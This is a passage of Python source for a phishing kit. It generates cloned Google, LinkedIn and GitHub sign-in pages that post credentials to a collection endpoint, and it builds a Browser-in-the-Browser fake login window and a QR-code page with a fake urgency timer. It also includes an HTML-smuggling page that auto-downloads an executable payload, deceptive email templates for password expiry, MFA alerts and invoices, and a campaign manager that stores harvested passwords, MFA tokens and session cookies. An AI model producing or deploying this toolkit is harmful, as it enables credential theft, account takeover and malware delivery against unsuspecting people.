            padding: 12px 14px;
        }}
        .forgot-link {{
            margin-bottom: 24px;
        }}
        .forgot-link a {{
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }}
        .buttons {{
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .btn-text {{
            color: #1a73e8;
            background: none;
            border: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }}
        .btn-primary {{
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }}
        .btn-primary:hover {{
            background: #1765cc;
        }}
        .message {{
            background: #fef7e0;
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 24px;
            font-size: 14px;
            color: #3c4043;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 75 24" width="75" height="24">
                <path fill="#4285F4" d="M0 19.5V4.5h4.18c1.71 0 3.14.45 4.3 1.35 1.16.9 1.74 2.1 1.74 3.6 0 1.5-.58 2.7-1.74 3.6-1.16.9-2.59 1.35-4.3 1.35H2.65v5.1H0zm2.65-7.65h1.53c.97 0 1.73-.25 2.28-.75.55-.5.83-1.15.83-1.95s-.28-1.45-.83-1.95c-.55-.5-1.31-.75-2.28-.75H2.65v5.4z"/>
                <path fill="#EA4335" d="M11.2 19.5V4.5h4.18c1.71 0 3.14.45 4.3 1.35 1.16.9 1.74 2.1 1.74 3.6 0 1.5-.58 2.7-1.74 3.6-1.16.9-2.59 1.35-4.3 1.35h-1.53v5.1H11.2z"/>
            </svg>
        </div>
        
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        
        {f'<div class="message">{html.escape(message)}</div>' if message else ''}
        
        <form id="loginForm" action="/api/collect" method="POST">
            <div class="form-group">
                <input type="email" name="identifier" id="email" placeholder="Email or phone" required>
            </div>
            
            <div class="form-group password-group" style="display:none;">
                <input type="password" name="Passwd" id="password" placeholder="Enter your password">
            </div>
            
            <div class="forgot-link">
                <a href="#">Forgot email?</a>
            </div>
            
            <div class="buttons">
                <button type="button" class="btn-text">Create account</button>
                <button type="submit" class="btn-primary">Next</button>
            </div>
        </form>
    </div>
    
    <script>
        var step = 1;
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            if (step === 1) {{
                e.preventDefault();
                document.querySelector('.password-group').style.display = 'block';
                document.getElementById('password').required = true;
                document.querySelector('h1').textContent = 'Welcome';
                document.querySelector('.subtitle').textContent = document.getElementById('email').value;
                document.getElementById('email').style.display = 'none';
                document.querySelector('.forgot-link a').textContent = 'Forgot password?';
                step = 2;
                document.getElementById('password').focus();
            }}
        }});
    </script>
</body>
</html>'''

    def _generate_linkedin_page(self, message: str) -> str:
        """Generate LinkedIn phishing page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LinkedIn Login</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto;
            background: #f3f2ef;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 24px;
        }}
        .logo {{ margin-bottom: 24px; }}
        .login-box {{
            background: #fff;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            width: 100%;
            max-width: 352px;
        }}
        h1 {{
            font-size: 32px;
            font-weight: 600;
            color: rgba(0,0,0,0.9);
            margin-bottom: 8px;
        }}
        .subtitle {{
            font-size: 14px;
            color: rgba(0,0,0,0.6);
            margin-bottom: 24px;
        }}
        .form-group {{ margin-bottom: 16px; }}
        .form-group label {{
            display: block;
            font-size: 14px;
            color: rgba(0,0,0,0.6);
            margin-bottom: 4px;
        }}
        .form-group input {{
            width: 100%;
            padding: 12px;
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 4px;
            font-size: 16px;
        }}
        .form-group input:focus {{
            border-color: #0a66c2;
            box-shadow: 0 0 0 1px #0a66c2;
            outline: none;
        }}
        .btn-primary {{
            width: 100%;
            padding: 12px;
            background: #0a66c2;
            color: #fff;
            border: none;
            border-radius: 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 16px;
        }}
        .btn-primary:hover {{ background: #004182; }}
        .divider {{
            display: flex;
            align-items: center;
            margin: 16px 0;
            color: rgba(0,0,0,0.6);
        }}
        .divider::before, .divider::after {{
            content: '';
            flex: 1;
            border-bottom: 1px solid rgba(0,0,0,0.15);
        }}
        .divider span {{ padding: 0 8px; }}
        .social-btn {{
            width: 100%;
            padding: 12px;
            background: #fff;
            border: 1px solid rgba(0,0,0,0.6);
            border-radius: 24px;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }}
    </style>
</head>
<body>
    <div class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" width="84" height="21" viewBox="0 0 84 21">
            <path fill="#0a66c2" d="M82.5 0h-81C.7 0 0 .7 0 1.5v18c0 .8.7 1.5 1.5 1.5h81c.8 0 1.5-.7 1.5-1.5v-18c0-.8-.7-1.5-1.5-1.5zM25 18h-4V8h4v10zm-2-11.5c-1.3 0-2.3-1-2.3-2.3s1-2.3 2.3-2.3 2.3 1 2.3 2.3-1 2.3-2.3 2.3zM59 18h-4v-5.5c0-1.3-.5-2.3-1.8-2.3-1 0-1.6.7-1.9 1.3-.1.2-.1.6-.1.9V18h-4V8h4v1.4c.5-.8 1.5-2 3.6-2 2.6 0 4.2 1.7 4.2 5.4V18z"/>
        </svg>
    </div>
    
    <div class="login-box">
        <h1>Sign in</h1>
        <p class="subtitle">Stay updated on your professional world</p>
        
        <form action="/api/collect" method="POST">
            <div class="form-group">
                <label>Email or Phone</label>
                <input type="text" name="session_key" required>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="session_password" required>
            </div>
            
            <button type="submit" class="btn-primary">Sign in</button>
        </form>
        
        <div class="divider"><span>or</span></div>
        
        <button class="social-btn">
            <svg width="20" height="20" viewBox="0 0 20 20"><path fill="#4285F4" d="M19.8 10.2c0-.7-.1-1.4-.2-2H10v3.8h5.5c-.2 1.3-1 2.4-2.1 3.1v2.6h3.4c2-1.8 3-4.5 3-7.5z"/><path fill="#34A853" d="M10 20c2.8 0 5.2-1 6.9-2.6l-3.4-2.6c-.9.6-2.1 1-3.5 1-2.7 0-5-1.8-5.8-4.3H.7v2.7C2.4 17.8 5.9 20 10 20z"/><path fill="#FBBC05" d="M4.2 11.5c-.2-.6-.3-1.3-.3-2s.1-1.4.3-2V4.8H.7C.2 5.8 0 6.9 0 8s.2 2.2.7 3.2l3.5-2.7z"/><path fill="#EA4335" d="M10 3.9c1.5 0 2.9.5 4 1.5l3-3C15.2.9 12.8 0 10 0 5.9 0 2.4 2.2.7 5.5l3.5 2.7c.8-2.5 3.1-4.3 5.8-4.3z"/></svg>
            Sign in with Google
        </button>
    </div>
</body>
</html>'''

    def _generate_github_page(self, message: str) -> str:
        """Generate GitHub phishing page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }}
        .logo {{
            margin-bottom: 24px;
        }}
        .login-box {{
            background: #161b22;
            padding: 16px;
            border: 1px solid #30363d;
            border-radius: 6px;
            width: 100%;
            max-width: 308px;
        }}
        h1 {{
            font-size: 24px;
            font-weight: 300;
            text-align: center;
            margin-bottom: 16px;
        }}
        .form-group {{
            margin-bottom: 16px;
        }}
        .form-group label {{
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }}
        .form-group input {{
            width: 100%;
            padding: 5px 12px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 14px;
        }}
        .form-group input:focus {{
            border-color: #58a6ff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }}
        .btn-primary {{
            width: 100%;
            padding: 5px 16px;
            background: #238636;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }}
        .btn-primary:hover {{
            background: #2ea043;
        }}
        .links {{
            text-align: center;
            margin-top: 16px;
        }}
        .links a {{
            color: #58a6ff;
            text-decoration: none;
            font-size: 12px;
        }}
        .signup-box {{
            background: #161b22;
            padding: 16px;
            border: 1px solid #30363d;
            border-radius: 6px;
            width: 100%;
            max-width: 308px;
            margin-top: 16px;
            text-align: center;
        }}
        .signup-box a {{
            color: #58a6ff;
            text-decoration: none;
        }}
    </style>
</head>
<body>
    <div class="logo">
        <svg height="48" viewBox="0 0 16 16" fill="#fff" width="48">
            <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
        </svg>
    </div>
    
    <div class="login-box">
        <h1>Sign in to GitHub</h1>
        
        <form action="/api/collect" method="POST">
            <div class="form-group">
                <label>Username or email address</label>
                <input type="text" name="login" required>
            </div>
            
            <div class="form-group">
                <label>
                    Password
                    <a href="#" style="float:right;font-weight:400;color:#58a6ff;">Forgot password?</a>
                </label>
                <input type="password" name="password" required>
            </div>
            
            <button type="submit" class="btn-primary">Sign in</button>
        </form>
        
        <div class="links">
            <a href="#">Sign in with a passkey</a>
        </div>
    </div>
    
    <div class="signup-box">
        New to GitHub? <a href="#">Create an account</a>.
    </div>
</body>
</html>'''

    def _generate_generic_page(self, message: str) -> str:
        """Generate generic phishing page"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Login</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .login-container {{
            background: #fff;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }}
        h1 {{
            font-size: 28px;
            color: #1a1a2e;
            margin-bottom: 8px;
            text-align: center;
        }}
        .subtitle {{
            color: #666;
            text-align: center;
            margin-bottom: 32px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        .form-group label {{
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }}
        .form-group input {{
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }}
        .form-group input:focus {{
            border-color: #667eea;
            outline: none;
        }}
        .btn-primary {{
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }}
        .btn-primary:hover {{
            opacity: 0.9;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Welcome Back</h1>
        <p class="subtitle">Sign in to continue</p>
        
        <form action="/api/collect" method="POST">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="email" required>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            
            <button type="submit" class="btn-primary">Sign In</button>
        </form>
    </div>
</body>
</html>'''


# ==================== BROWSER-IN-BROWSER ATTACK ====================

class BrowserInBrowserGenerator:
    """Generate Browser-in-the-Browser (BitB) phishing pages"""
    
    def __init__(self, platform: TargetPlatform):
        self.platform = platform
        self.config = BRAND_CONFIGS.get(platform.value, {})
    
    def generate(self, popup_url: str = "https://accounts.google.com/signin/oauth") -> str:
        """Generate BitB attack page"""
        
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Google</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        
        /* Fake browser window */
        .bitb-window {{
            width: 450px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.25);
            overflow: hidden;
        }}
        
        /* Fake title bar */
        .title-bar {{
            background: #dee1e6;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }}
        
        .window-controls {{
            display: flex;
            gap: 6px;
        }}
        
        .window-controls span {{
            width: 12px;
            height: 12px;
            border-radius: 50%;
        }}
        
        .close {{ background: #ff5f57; }}
        .minimize {{ background: #ffbd2e; }}
        .maximize {{ background: #28ca41; }}
        
        /* Fake address bar */
        .address-bar {{
            flex: 1;
            background: #fff;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            color: #333;
            display: flex;
            align-items: center;
            gap: 6px;
        }}
        
        .lock-icon {{
            color: #1a73e8;
        }}
        
        .url-text {{
            color: #5f6368;
        }}
        
        .url-text .domain {{
            color: #202124;
        }}
        
        /* Content iframe area */
        .content-frame {{
            padding: 40px;
        }}
        
        .google-logo {{
            text-align: center;
            margin-bottom: 24px;
        }}
        
        h1 {{
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            text-align: center;
            margin-bottom: 8px;
        }}
        
        .subtitle {{
            text-align: center;
            color: #5f6368;
            margin-bottom: 24px;
        }}
        
        .form-group {{
            margin-bottom: 16px;
        }}
        
        .form-group input {{
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }}
        
        .form-group input:focus {{
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
        }}
        
        .buttons {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }}
        
        .btn-text {{
            color: #1a73e8;
            background: none;
            border: none;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }}
        
        .btn-primary {{
            background: #1a73e8;
            color: #fff;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }}
    </style>
</head>
<body>
    <div class="bitb-window">
        <!-- Fake title bar -->
        <div class="title-bar">
            <div class="window-controls">
                <span class="close"></span>
                <span class="minimize"></span>
                <span class="maximize"></span>
            </div>
            
            <div class="address-bar">
                <span class="lock-icon">🔒</span>
                <span class="url-text">
                    <span class="domain">accounts.google.com</span>/signin/oauth/consent
                </span>
            </div>
        </div>
        
        <!-- Fake content -->
        <div class="content-frame">
            <div class="google-logo">
                <svg viewBox="0 0 75 24" width="75" height="24">
                    <path fill="#4285F4" d="M0 19.5V4.5h4.18c1.71 0 3.14.45 4.3 1.35 1.16.9 1.74 2.1 1.74 3.6 0 1.5-.58 2.7-1.74 3.6-1.16.9-2.59 1.35-4.3 1.35H2.65v5.1H0z"/>
                </svg>
            </div>
            
            <h1>Sign in</h1>
            <p class="subtitle">to continue to Application</p>
            
            <form action="/api/collect" method="POST">
                <div class="form-group">
                    <input type="email" name="identifier" placeholder="Email or phone" required>
                </div>
                
                <div class="form-group password-group" style="display:none;">
                    <input type="password" name="Passwd" placeholder="Enter your password">
                </div>
                
                <div class="buttons">
                    <button type="button" class="btn-text">Create account</button>
                    <button type="submit" class="btn-primary">Next</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        var step = 1;
        document.querySelector('form').addEventListener('submit', function(e) {{
            if (step === 1) {{
                e.preventDefault();
                document.querySelector('.password-group').style.display = 'block';
                document.querySelector('.password-group input').required = true;
                document.querySelector('h1').textContent = 'Welcome';
                document.querySelector('.subtitle').textContent = document.querySelector('input[name="identifier"]').value;
                step = 2;
            }}
        }});
    </script>
</body>
</html>'''


# ==================== QR PHISHING ====================

class QRPhishingGenerator:
    """QR code phishing (QRishing) generator"""
    
    def __init__(self):
        self.qr_payloads = []
    
    def generate_qr_page(self, phishing_url: str, message: str = "Scan to continue") -> str:
        """Generate a page with QR code leading to phishing"""
        
        # Simple QR code SVG generation (basic)
        qr_svg = self._generate_simple_qr_svg(phishing_url)
        
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Identity</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }}
        .container {{
            text-align: center;
            padding: 40px;
        }}
        .qr-box {{
            background: #fff;
            padding: 20px;
            border-radius: 16px;
            display: inline-block;
            margin-bottom: 24px;
        }}
        h1 {{
            font-size: 28px;
            margin-bottom: 12px;
        }}
        p {{
            color: #a0a0a0;
            margin-bottom: 24px;
        }}
        .instructions {{
            background: rgba(255,255,255,0.1);
            padding: 16px 24px;
            border-radius: 8px;
            font-size: 14px;
        }}
        .timer {{
            font-size: 24px;
            color: #ff6b6b;
            margin-top: 16px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Verify Your Identity</h1>
        <p>{html.escape(message)}</p>
        
        <div class="qr-box">
            {qr_svg}
        </div>
        
        <div class="instructions">
            <p>📱 Open your authenticator app</p>
            <p>📷 Scan this QR code</p>
            <p>✅ Approve the sign-in request</p>
        </div>
        
        <div class="timer" id="timer">04:59</div>
    </div>
    
    <script>
        // Fake countdown timer for urgency
        var timeLeft = 299;
        var timer = setInterval(function() {{
            var minutes = Math.floor(timeLeft / 60);
            var seconds = timeLeft % 60;
            document.getElementById('timer').textContent = 
                String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
            if (--timeLeft < 0) {{
                clearInterval(timer);
                document.getElementById('timer').textContent = 'EXPIRED';
            }}
        }}, 1000);
    </script>
</body>
</html>'''
    
    def _generate_simple_qr_svg(self, url: str) -> str:
        """Generate a placeholder QR code SVG"""
        # In production, use qrcode library
        return f'''<svg width="200" height="200" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
            <rect width="200" height="200" fill="#fff"/>
            <text x="100" y="100" text-anchor="middle" fill="#000" font-size="12">
                [QR Code]
            </text>
            <text x="100" y="120" text-anchor="middle" fill="#666" font-size="8">
                {url[:30]}...
            </text>
        </svg>'''


# ==================== HTML SMUGGLING ====================

class HTMLSmugglingGenerator:
    """HTML Smuggling payload generator"""
    
    def __init__(self):
        self.payloads = []
    
    def generate_smuggling_page(self, payload_data: bytes, filename: str = "document.exe",
                                 decoy_content: str = "Loading your document...") -> str:
        """Generate HTML smuggling page"""
        
        # Base64 encode payload
        b64_payload = base64.b64encode(payload_data).decode()
        
        return f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Document Viewer</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #f5f5f5;
            margin: 0;
        }}
        .loader {{
            text-align: center;
        }}
        .spinner {{
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>{html.escape(decoy_content)}</p>
    </div>
    
    <script>
    (function() {{
        // Decode and download payload
        var base64 = "{b64_payload}";
        var binary = atob(base64);
        var bytes = new Uint8Array(binary.length);
        for (var i = 0; i < binary.length; i++) {{
            bytes[i] = binary.charCodeAt(i);
        }}
        
        var blob = new Blob([bytes], {{type: 'application/octet-stream'}});
        var url = URL.createObjectURL(blob);
        
        var a = document.createElement('a');
        a.href = url;
        a.download = '{filename}';
        document.body.appendChild(a);
        
        // Auto-download after short delay
        setTimeout(function() {{
            a.click();
            URL.revokeObjectURL(url);
        }}, 2000);
    }})();
    </script>
</body>
</html>'''


# ==================== EMAIL TEMPLATE GENERATOR ====================

class PhishingEmailGenerator:
    """Generate convincing phishing emails"""
    
    TEMPLATES = {
        "password_expiry": {
            "subject": "⚠️ Action Required: Your password expires in 24 hours",
            "urgency": "high",
            "body": """
            <p>Dear {name},</p>
            <p>Your organization password is set to expire in <strong>24 hours</strong>.</p>
            <p>To avoid losing access to your account and corporate resources, please update your password immediately.</p>
            <p><a href="{link}" style="background:#0078d4;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Update Password Now</a></p>
            <p>If you don't update your password, you may be locked out of:</p>
            <ul>
                <li>Email and Calendar</li>
                <li>SharePoint and OneDrive</li>
                <li>Teams and other Microsoft 365 apps</li>
            </ul>
            <p>Best regards,<br>IT Security Team</p>
            """
        },
        "document_share": {
            "subject": "📎 {sender} shared a document with you",
            "urgency": "medium",
            "body": """
            <p>Hi {name},</p>
            <p><strong>{sender}</strong> has shared a document with you:</p>
            <div style="background:#f5f5f5;padding:16px;border-radius:8px;margin:16px 0;">
                <p style="margin:0;">📄 <strong>{document_name}</strong></p>
                <p style="margin:8px 0 0;color:#666;font-size:14px;">"Please review this before our meeting tomorrow"</p>
            </div>
            <p><a href="{link}" style="background:#0078d4;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Open Document</a></p>
            <p style="color:#666;font-size:12px;">This link will expire in 7 days.</p>
            """
        },
        "mfa_required": {
            "subject": "🔐 Security Alert: Unusual sign-in activity detected",
            "urgency": "high",
            "body": """
            <p>Dear {name},</p>
            <p>We detected an unusual sign-in attempt to your account:</p>
            <div style="background:#fff3cd;padding:16px;border-radius:8px;margin:16px 0;border-left:4px solid #ffc107;">
                <p style="margin:0;"><strong>Location:</strong> {location}</p>
                <p style="margin:8px 0 0;"><strong>Device:</strong> {device}</p>
                <p style="margin:8px 0 0;"><strong>Time:</strong> {time}</p>
            </div>
            <p>If this was you, please verify your identity to secure your account:</p>
            <p><a href="{link}" style="background:#dc3545;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Verify My Identity</a></p>
            <p>If you don't recognize this activity, your account may be compromised. Please verify immediately.</p>
            """
        },
        "invoice": {
            "subject": "Invoice #{invoice_num} - Payment Required",
            "urgency": "medium",
            "body": """
            <p>Dear {name},</p>
            <p>Please find attached Invoice #{invoice_num} for your recent order.</p>
            <div style="background:#f8f9fa;padding:16px;border-radius:8px;margin:16px 0;">
                <table style="width:100%;">
                    <tr><td>Invoice Number:</td><td><strong>#{invoice_num}</strong></td></tr>
                    <tr><td>Amount Due:</td><td><strong>${amount}</strong></td></tr>
                    <tr><td>Due Date:</td><td><strong>{due_date}</strong></td></tr>
                </table>
            </div>
            <p><a href="{link}" style="background:#28a745;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">View Invoice & Pay</a></p>
            """
        },
        "voicemail": {
            "subject": "🎤 You have a new voicemail from {caller}",
            "urgency": "low",
            "body": """
            <p>Hi {name},</p>
            <p>You received a new voicemail:</p>
            <div style="background:#f5f5f5;padding:16px;border-radius:8px;margin:16px 0;">
                <p style="margin:0;">📞 <strong>From:</strong> {caller}</p>
                <p style="margin:8px 0 0;">⏱️ <strong>Duration:</strong> {duration}</p>
                <p style="margin:8px 0 0;">📅 <strong>Received:</strong> {time}</p>
            </div>
            <p><a href="{link}" style="background:#0078d4;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">▶️ Play Voicemail</a></p>
            """
        }
    }
    
    def generate(self, template_name: str, variables: Dict[str, str]) -> Dict[str, str]:
        """Generate phishing email from template"""
        
        template = self.TEMPLATES.get(template_name, self.TEMPLATES["document_share"])
        
        subject = template["subject"]
        body = template["body"]
        
        # Replace variables
        for key, value in variables.items():
            subject = subject.replace("{" + key + "}", value)
            body = body.replace("{" + key + "}", value)
        
        # Wrap in email HTML
        full_html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; max-width: 600px; margin: 0 auto; padding: 20px; }}
        a {{ color: #0078d4; }}
    </style>
</head>
<body>
    {body}
</body>
</html>'''
        
        return {
            "subject": subject,
            "body_html": full_html,
            "body_text": self._html_to_text(body),
            "urgency": template["urgency"]
        }
    
    def _html_to_text(self, html_content: str) -> str:
        """Convert HTML to plain text"""
        # Simple conversion
        text = re.sub(r'<br\s*/?>', '\n', html_content)
        text = re.sub(r'<p[^>]*>', '\n', text)
        text = re.sub(r'</p>', '\n', text)
        text = re.sub(r'<[^>]+>', '', text)
        text = html.unescape(text)
        return text.strip()


# ==================== CAMPAIGN MANAGER ====================

class PhishingCampaignManager:
    """Manage phishing campaigns"""
    
    def __init__(self):
        self.campaigns: Dict[str, PhishingCampaign] = {}
        self.credentials: List[HarvestedCredential] = []
    
    def create_campaign(self, name: str, platform: TargetPlatform,
                       phishing_type: PhishingType,
                       targets: List[str] = None) -> PhishingCampaign:
        """Create a new phishing campaign"""
        
        campaign_id = secrets.token_hex(8)
        
        campaign = PhishingCampaign(
            id=campaign_id,
            name=name,
            target_platform=platform,
            phishing_type=phishing_type,
            target_emails=targets or [],
            expires_at=datetime.now() + timedelta(days=7)
        )
        
        self.campaigns[campaign_id] = campaign
        return campaign
    
    def generate_campaign_assets(self, campaign_id: str) -> Dict[str, Any]:
        """Generate all assets for a campaign"""
        
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return {"error": "Campaign not found"}
        
        assets = {
            "campaign_id": campaign_id,
            "landing_page": None,
            "email_templates": [],
            "tracking_pixel": None,
            "qr_code": None
        }
        
        # Generate landing page
        generator = LandingPageGenerator(
            campaign.target_platform,
            campaign.obfuscation_level
        )
        
        include_mfa = campaign.mfa_bypass_enabled
        assets["landing_page"] = generator.generate(include_mfa=include_mfa)
        
        # Generate email templates
        email_gen = PhishingEmailGenerator()
        for template_name in ["password_expiry", "document_share", "mfa_required"]:
            email = email_gen.generate(template_name, {
                "name": "User",
                "link": campaign.landing_page_url or f"/phish/{campaign_id}",
                "sender": "John Smith",
                "document_name": "Q4_Report.pdf",
                "location": "Unknown Location",
                "device": "Windows PC",
                "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            assets["email_templates"].append(email)
        
        # Generate tracking pixel
        assets["tracking_pixel"] = f'<img src="/api/track/{campaign_id}" width="1" height="1" style="display:none">'
        
        return assets
    
    def record_credential(self, campaign_id: str, credential_data: Dict) -> bool:
        """Record a harvested credential"""
        
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return False
        
        cred = HarvestedCredential(
            timestamp=datetime.now(),
            email=credential_data.get("email", ""),
            password=credential_data.get("password", ""),
            mfa_token=credential_data.get("mfa_token"),
            session_cookies=credential_data.get("cookies"),
            user_agent=credential_data.get("user_agent", ""),
            ip_address=credential_data.get("ip", ""),
            additional_data=credential_data
        )
        
        self.credentials.append(cred)
        campaign.collected_creds.append(credential_data)
        
        return True
    
    def get_campaign_stats(self, campaign_id: str) -> Dict:
        """Get campaign statistics"""
        
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return {"error": "Campaign not found"}
        
        return {
            "campaign_id": campaign_id,
            "name": campaign.name,
            "platform": campaign.target_platform.value,
            "type": campaign.phishing_type.value,
            "total_targets": len(campaign.target_emails),
            "credentials_captured": len(campaign.collected_creds),
            "success_rate": f"{(len(campaign.collected_creds) / max(len(campaign.target_emails), 1)) * 100:.1f}%",
            "created_at": campaign.created_at.isoformat(),
            "expires_at": campaign.expires_at.isoformat() if campaign.expires_at else None,
            "mfa_bypass_enabled": campaign.mfa_bypass_enabled
        }


# ==================== MAIN API ====================

class PhishingKitAPI:
    """Main API for the phishing kit"""
    
    def __init__(self):
        self.campaign_manager = PhishingCampaignManager()
        self.landing_generators: Dict[str, LandingPageGenerator] = {}
        self.mfa_engines: Dict[str, MFABypassEngine] = {}
    
    def create_landing_page(self, platform: str, obfuscation: str = "medium",
                           include_mfa: bool = False, custom_message: str = "",
